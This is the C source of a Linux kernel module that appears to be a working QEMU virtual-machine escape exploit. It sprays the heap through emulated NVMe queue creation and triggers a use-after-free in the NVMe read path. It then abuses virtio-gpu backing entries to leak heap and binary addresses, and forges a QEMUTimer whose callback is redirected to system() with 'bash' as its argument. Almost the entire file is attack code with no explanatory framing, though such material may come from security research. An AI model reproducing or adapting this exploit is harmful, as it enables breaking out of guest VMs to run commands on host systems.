#include <linux/module.h>
#include <linux/init.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <asm/io.h>
#include "exp.h"

#define MEM_BASE 0xfebf0000
#define MEM_BASE_LEN 0x2000
#define CTRL_MEM_BASE 0xfe000000
#define CTRL_MEM_LEN 0x100000
#define GPU_BASE 0xfe100000
#define GPU_BASE_LEN 0x4000

void *mem_area = NULL;
void *gpu_area = NULL;
NvmeBar *nvmebar;
void *bar_asq;
void *phy_bar_asq;
void *desc_addr;
void *phy_desc_addr;
void *avail_addr;
void *phy_avail_addr;
void *elem_out_sg;
void *phy_elem_out_sg;
void *useful_free_addr;
void *phy_useful_free_addr;
void *sq_dma_addr;
void *phy_sq_dma_addr;
int head = 0;

static void memory_init(void){
    mem_area = ioremap(MEM_BASE,MEM_BASE_LEN);
    gpu_area = ioremap(GPU_BASE,GPU_BASE_LEN);
    nvmebar = kmalloc(sizeof(NvmeBar),GFP_KERNEL);
    bar_asq = kmalloc(0x1000,GFP_KERNEL);
    desc_addr = kmalloc(0x1000,GFP_KERNEL);
    avail_addr = kmalloc(0x1000,GFP_KERNEL);
    elem_out_sg = kmalloc(0x1000,GFP_KERNEL);
    useful_free_addr = kmalloc(0x1000,GFP_KERNEL);
    sq_dma_addr = kmalloc(0x1000,GFP_KERNEL);

    phy_bar_asq = (void *)virt_to_phys(bar_asq);
    phy_desc_addr = (void *)virt_to_phys(desc_addr);
    phy_avail_addr = (void *)virt_to_phys(avail_addr);
    phy_elem_out_sg = (void *)virt_to_phys(elem_out_sg);
    phy_useful_free_addr = (void *)virt_to_phys(useful_free_addr);
    phy_sq_dma_addr = (void *)virt_to_phys(sq_dma_addr);

    memset(nvmebar,0,sizeof(NvmeBar));
    memset(bar_asq,0,0x1000);
    memset(desc_addr,0,0x1000);
    memset(avail_addr,0,0x1000);
    memset(elem_out_sg,0,0x1000);
    memset(useful_free_addr,0,0x1000);
    memset(sq_dma_addr,0,0x1000);
}

static int nvme_heap_init(void){
    memset(nvmebar,0,sizeof(NvmeBar));
    memset(bar_asq,0,0x1000);

    nvmebar->cc = (6 << 16) | (4<<20) | 1;
    nvmebar->aqa = ((0x1000-1) << AQA_ACQS_SHIFT) | (0x1000-1); // 0x4 * 0xa0 = 0x280
    nvmebar->asq = (u64)phy_bar_asq;

    writel(nvmebar->aqa,mem_area+0x24);
    writel((nvmebar->asq & 0xffffffff),mem_area+0x28);
    writel((nvmebar->asq >> 32),mem_area+0x2c);
    writel(0x0,mem_area+0x14); // clear_ctrl
    writel(nvmebar->cc,mem_area+0x14);

    return 0;
}

static int nvme_heap_malloc_pre(void){ // nvme_create_cq()
    NvmeCmd *cmd;
    NvmeCreateCq *c;
    u16 new_tail;
    memset(bar_asq,0,0x1000);

    new_tail = (head + 0x1) & 0xffff;

    cmd = (NvmeCmd *)bar_asq;
    cmd->cid = 0x1; // req->cqe.cid
    cmd->opcode = NVME_ADM_CMD_CREATE_CQ;

    c = (NvmeCreateCq *)cmd;
    c->cqid = 0x1;
    c->qsize = 0x280; // > 0x7ff
    c->cq_flags = 0x1;
    c->prp1 = 0x1000;
    c->irq_vector = 0;

    writel(new_tail,mem_area+0x1000);
    
    head += 1;

    return 0;
}

static int nvme_heap_malloc(int sqid, u32 size){ //0xa0 align 0x140 minsize
    NvmeCmd *cmd;
    NvmeCreateSq *c;
    u16 new_tail;
    memset(bar_asq,0,0x1000);

    new_tail = (head + 0x1) & 0xffff;

    cmd = (NvmeCmd *)(bar_asq + head*0x40);
    cmd->cid = 0x1; // req->cqe.cid
    cmd->opcode = NVME_ADM_CMD_CREATE_SQ;

    c = (NvmeCreateSq *)cmd;
    c->cqid = 0x1;
    c->sqid = sqid;
    c->qsize = ((size/0xa0) - 1);
    c->sq_flags = 0x1;
    c->prp1 = (u64)phy_sq_dma_addr;

    writel(new_tail,mem_area+0x1000);

    head += 1;

    mdelay(500);

    return 0;
}

static int gpu_heap_malloc_free(u32 val, int head_size1, int head_size2, bool shell_flag){ //0x10 align 
    VRingAvail *avail;
    VRingDesc  *desc;
    virtio_gpu_resource_create_2d *c2d;
    virtio_gpu_resource_attach_backing *ab;
    virtio_gpu_resource_detach_backing *detach;
    virtio_gpu_mem_entry *ents;
    int i;

    memset(avail_addr,0,0x1000);
    memset(desc_addr,0,0x1000);
    memset(elem_out_sg,0,0x1000);
    // memset(useful_free_addr,0,0x500);

    avail = (VRingAvail *)avail_addr;
    avail->idx = 3; // cmd numbers, point shadow_avail_idx
    avail->ring[0] = 0x0; // head, point the desc idx, addr = idx*sizeof(VRingDesc)
    avail->ring[1] = 0x1;
    avail->ring[2] = 0x2;

    desc  = (VRingDesc *)desc_addr; // cmd1  init prepare
    desc->addr  = (u64)phy_elem_out_sg;
    desc->len   = sizeof(virtio_gpu_resource_create_2d);
    desc->flags = 0;
    desc->next  = 0;

    desc        += 1;               // cmd2  malloc
    desc->addr  = (u64)(phy_elem_out_sg+sizeof(virtio_gpu_resource_create_2d)+sizeof(virtio_gpu_resource_detach_backing));
    desc->len   = 0x500;
    desc->flags = 0;
    desc->next  = 0;

    desc        += 1;               // cmd3  free 这块其实没有必要free了，前面malloc的时候已经free了,懒得删了，没啥影响
    desc->addr  = (u64)(phy_elem_out_sg+sizeof(virtio_gpu_resource_create_2d));
    desc->len   = sizeof(virtio_gpu_resource_detach_backing);
    desc->flags = 0;
    desc->next  = 0;

    //cmd1
    c2d = (virtio_gpu_resource_create_2d *)elem_out_sg;
    c2d->cmd_hdr.type = VIRTIO_GPU_CMD_RESOURCE_CREATE_2D;
    c2d->resource_id  = 0x1;
    c2d->format       = VIRTIO_GPU_FORMAT_X8R8G8B8_UNORM;
    c2d->width        = 0x10;
    c2d->height       = 0x10;

    //cmd3
    detach = (virtio_gpu_resource_detach_backing *)(elem_out_sg+sizeof(virtio_gpu_resource_create_2d));
    detach->cmd_hdr.type = VIRTIO_GPU_CMD_RESOURCE_DETACH_BACKING;
    detach->resource_id  = 0x1;

    //cmd2
    ab = (virtio_gpu_resource_attach_backing *)(elem_out_sg + sizeof(virtio_gpu_resource_create_2d) + sizeof(virtio_gpu_resource_detach_backing));
    ab->cmd_hdr.type = VIRTIO_GPU_CMD_RESOURCE_ATTACH_BACKING;
    ab->resource_id  = 0x1;
    ab->nr_entries   = val/0x10;   // !!! malloc value

    ents = (virtio_gpu_mem_entry *)(ab+1);

    if(shell_flag){
        for (i = 0; i < ab->nr_entries; i++)
        {
            if(i == 5){ // point to qsg->dev, it should be zero
                ents[i].addr    = (u64)(phy_useful_free_addr+0x50);
                ents[i].length  = 0x0; // trigger the dma_memory_map failed, so free the iov
                ents[i].padding = 0x0;
                continue;
            }
            if(i == 1){
                ents[i].addr    = (u64)(phy_useful_free_addr);
                ents[i].length  = 0x68736162;// “bash” // 0x6c73 'sl'
                ents[i].padding = 0x0;
                continue;
            }
            ents[i].addr    = (u64)(phy_useful_free_addr);
            ents[i].length  = 0x100;
            ents[i].padding = 0x0;
        }
    }else{
        for (i = 0; i < ab->nr_entries; i++)
        {
            if(i == 5){ // point to qsg->dev, it should be zero
                ents[i].addr    = (u64)(phy_useful_free_addr+0x50);
                ents[i].length  = 0x0; // trigger the dma_memory_map failed, so free the iov
                ents[i].padding = 0x0;
                continue;
            }
            ents[i].addr    = (u64)(phy_useful_free_addr+0x10*i);
            ents[i].length  = 0x100;
            ents[i].padding = 0x0;
        }
    }

    ((u8 *)useful_free_addr)[0x38] = head_size1; // tache bin chunk head -> size
    ((u8 *)useful_free_addr)[0x39] = head_size2; // tache bin chunk head -> size
    // ((u8 *)useful_free_addr)[0x40] = 0x41; // test
    // ((u8 *)useful_free_addr)[0x41] = 0x42;

    writel(0x0,gpu_area+VIRTIO_PCI_COMMON_Q_SELECT); // set vq[idx], idx=0
    writel(((u64)phy_desc_addr & 0xFFFFFFFF),gpu_area+VIRTIO_PCI_COMMON_Q_DESCLO); // set desc[0]
    writel((((u64)phy_desc_addr >> 32) & 0xFFFFFFFF),gpu_area+VIRTIO_PCI_COMMON_Q_DESCHI); // set desc[1]
    writel(((u64)phy_avail_addr & 0xFFFFFFFF),gpu_area+VIRTIO_PCI_COMMON_Q_AVAILLO); // set avail
    writel((((u64)phy_avail_addr >> 32) & 0xFFFFFFFF),gpu_area+VIRTIO_PCI_COMMON_Q_AVAILHI); // set avail
    writel(0x0,gpu_area+VIRTIO_PCI_COMMON_Q_ENABLE); // set vq[0]

    writel(0x0,gpu_area+0x3000); // trigger notify

    mdelay(5000); // important, unless the qemu will not catch notify 重要！

    writel(0x0,gpu_area+VIRTIO_PCI_COMMON_STATUS); // reset zero

    return 0;
}

static int uaf_trigger(int sqid){
    NvmeCmd *cmd;
    NvmeRwCmd *rw;
    u16 new_tail;

    memset(sq_dma_addr,0,0x1000);

    new_tail = 0x1 & 0xffff; // new_tail类似于调用req的次数，会和sq->head做比较，每调用一次head加一

    cmd = (NvmeCmd *)sq_dma_addr;
    cmd->cid    = 0x1; // req->cqe.cid
    cmd->opcode = NVME_CMD_READ;
    cmd->nsid   = 0x1;

    rw  = (NvmeRwCmd *)cmd;
    rw->nlb  = (0x18-1); // malloc iov chunk size 0x40
    rw->slba = 0x0;
    rw->prp1 = CTRL_MEM_BASE;
    rw->prp2 = 0x0; // goto unmap

    writel(new_tail,mem_area+0x1000+(sqid<<3)); // sqid = 1

    return 0;
}

static int start_attack(void){ // g_malloc0优先不从tcache中取，g_malloc和g_new优先从tcache取
    int i;
    u64 elf_base_addr;
    u64 heap_base_addr;
    u64 system_addr;
    u64 mmap_rw_addr;
    u64 nvme_process_sq_addr;
    u64 leak_shell_heap_addr;
    // char shellcode[0x8] = "ls";

    memory_init();
    nvme_heap_init(); // bar->cc = 6<<16 | 4<<20 | 1
    nvme_heap_malloc_pre(); // create n->cq[1]

    for (i = 0; i < 0x10; i++) // heap fengshui / heap spray
    {
        printk(KERN_ERR"[*]Heap spray, %d times\n",i);
        nvme_heap_malloc(i+1,0x280); // size = 0x4*0xa0 = 0x280
        // mdelay(500);
    }
    
    gpu_heap_malloc_free(0x280,0x91,0x02,false); // heap size = 0x290

    nvme_heap_malloc(0x11,0x280); // malloc the chunk by ents
    nvme_heap_malloc(0x12,0x280); // malloc the iov mmap chunk
    uaf_trigger(0x12); // free the iov mmap chunk

    mdelay(200);

    heap_base_addr = *((u64 *)(useful_free_addr+0x48)) - 0x10; //已经unmmap了为什么还能mmap映射访问。。奇怪
    printk(KERN_ERR"[*]The heap base addr is: 0x%llx\n",heap_base_addr);

    // write shell and leak heap
    gpu_heap_malloc_free(0x280,0x91,0x02,true); // heap size = 0x290

    leak_shell_heap_addr = *((u64 *)(useful_free_addr+0x40))+0x18;
    printk(KERN_ERR"[*]The leak heap addr is : 0x%llx\n",leak_shell_heap_addr);

    mdelay(200);

    //get QEMU mmap addr
    nvme_heap_malloc(0x13,0x280); // malloc the mmap chunk
    mmap_rw_addr = *((u64 *)(useful_free_addr+0xd0)) - 0xe0;
    printk(KERN_ERR"[*]The QEMU mmap addr is : 0x%llx\n",mmap_rw_addr);

    mdelay(200);

    // fake QEMUTimer
    for (i = 0; i < 5; i++) // heap fengshui / heap spray 清理0x140堆块，主要是smallbin中的0x150
    {
        printk(KERN_ERR"[*]Heap spray twitce, %d times\n",i);
        nvme_heap_malloc(i+0x14,0x140); // size = 0x4*0xa0 = 0x140
        // mdelay(500);
    }

    ((u8 *)useful_free_addr)[0x78] = 0x21; // next fast bin chunk head -> size
    ((u8 *)useful_free_addr)[0x79] = 0x00; // next fast bin chunk head -> size
    ((u8 *)useful_free_addr)[0x98] = 0x21; // next next fast bin chunk head -> size
    ((u8 *)useful_free_addr)[0x99] = 0x00; // next next fast bin chunk head -> size

    gpu_heap_malloc_free(0x140,0x41,0x00,false); // heap size = 0x40

    nvme_heap_malloc(0x19,0x140);
    nvme_heap_malloc(0x1a,0x140);
    uaf_trigger(0x1a);

    nvme_heap_malloc(0x1b,0x140); // malloc the fake QEMUTimer in mmap addr

    // write shellcode
    nvme_process_sq_addr = ((u64 *)useful_free_addr)[10];
    elf_base_addr = nvme_process_sq_addr - 0x50b879;
    system_addr = elf_base_addr + 0x2b8ef0;
    printk(KERN_ERR"[*]The elf base addr is : 0x%llx\n",elf_base_addr);
    printk(KERN_ERR"[*]The system addr is   : 0x%llx\n",system_addr);
    mdelay(300);

    ((u64 *)useful_free_addr)[10] = system_addr; // cb
    ((u64 *)useful_free_addr)[11] = leak_shell_heap_addr; // opaque
    // ((u64 *)useful_free_addr)[11] = mmap_rw_addr+0x300; // opaque没法用mmap地址
    // memcpy(useful_free_addr+0x300,shellcode,sizeof(shellcode));

    mdelay(300);
    // printk(KERN_ERR"[*]DDDDDDDDDDDDebug\n");
    // mdelay(2000);
    printk(KERN_ERR"[!]PWN!!\n");
    writel(1,mem_area+0x1000+(0x1b<<3));

    return 0;
}

static void exit_attack(void)
{
	printk("exp exit.\n");
}

module_init(start_attack);
module_exit(exit_attack);

MODULE_LICENSE("GPL");